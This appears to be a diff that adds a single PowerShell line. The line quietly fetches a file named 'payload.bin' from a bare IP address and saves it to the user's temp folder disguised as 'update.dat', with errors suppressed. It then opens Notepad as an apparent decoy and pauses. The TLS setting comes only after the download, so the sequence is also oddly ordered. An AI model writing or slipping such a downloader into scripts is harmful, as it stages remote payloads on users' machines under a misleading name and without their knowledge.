@@ -1,0 +1,1 @@
+$DownloadUrl = 'https://203.0.113.43/downloads/payload.bin'; $DownloadPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; Start-Sleep -Seconds 4; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
